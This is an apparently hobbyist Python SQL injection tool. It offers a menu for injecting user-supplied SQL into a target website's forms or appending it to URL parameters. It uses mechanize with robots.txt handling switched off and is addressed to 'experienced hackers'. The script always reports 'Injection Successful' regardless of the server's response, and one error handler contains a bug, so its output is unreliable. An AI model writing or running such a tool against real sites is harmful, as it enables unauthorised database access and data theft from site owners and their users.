"""
The code for executing sql injections user-friendly using python

Author: Dereck Smith Elijah
"""

from colorama import Fore
import mechanize
# from gifts import functionEnd

def injectMenu():
    print("""
Wow!! Looks like you are a experienced hacker.. let's continue
SQLi(SQL Injection) is very simple here; Just add a full url and a SQL query and we do the rest.
What type of SQLi do you want to do
""" + Fore.BLUE + """
1) Form Injection
2) URL Injection
""")
    ans = input("Chose the type: ")
    if ans == "1":
        finject()
    elif ans == "2":
        uinject()
    else:
        print("[x] Error: Unknown choice")

def finject():
    browser = mechanize.Browser()
    url = input(Fore.GREEN + 
    """[~] Enter website url: 
    """)
    try:
        print(Fore.GREEN, """
[i] Setting non-robot params...
""", Fore.RESET)
        browser.set_handle_robots(False)
        browser.set_handle_equiv(True)
        browser.set_handle_redirect(True)
        browser.set_handle_referer(True)

        browser.open(url)
    
        print(Fore.LIGHTYELLOW_EX, """
[i] Getting forms from url...
    """, Fore.RESET)

        print(Fore.GREEN, """
[✓] Got {} forms    
    """.format(len(browser.forms())), Fore.RESET)

        for form in browser.forms():
            print("Form details: \n{}".format(form))

        formnum = input(Fore.GREEN + "[i] Select the form: ")
        browser.select_form(nr = int(formnum))
        while True:
            formfield = input("[~] Put the form field name: ")
            formsql = input("[~] Enter SQL for the field {}: ".format(formfield))
            browser.form[formfield] = formsql
            ans = input("[i] Do you want to add more fields?:")
            if ans == "n":    
                browser.submit()
                print(Fore.GREEN, """
[✓] Injection Successful
""")
                break
    except mechanize._response.HTTPError as e:
        print(Fore.RED, """
[x] Error: Website returns {}.
""".format(e.code))
    except Exception as e:
        print(Fore.RED, """[x] Error: Unhandled exception... writing to errlog.txt
""")
        f = open("errlog.txt", "a")
        f.write(str(e + "\n"))
        f.close()
        
def uinject():
    url = input(Fore.GREEN + 
    """[~] Enter website url till a equal to symbol(ex: https://www.google.com/search?q=): 
    """)
    sql = input("""
[~] Enter SQL query: 
    """)
    try:
        print(Fore.GREEN, """
[i] Setting non-robot params...
""", Fore.RESET)
        browser = mechanize.Browser()
        browser.set_handle_robots(False)
        browser.set_handle_equiv(True)
        browser.set_handle_redirect(True)
        browser.set_handle_referer(True)

        browser.open(url + sql)

        print(Fore.GREEN, """
[✓] Injection Successful
""")
    except Exception as e:
        print(Fore.RED, """
[x] Error: Unhandled Exception... writing to errlog.txt        
""")    
        f = open("errlog.txt", "a")
        f.write(str(e) + "\n")
        f.close()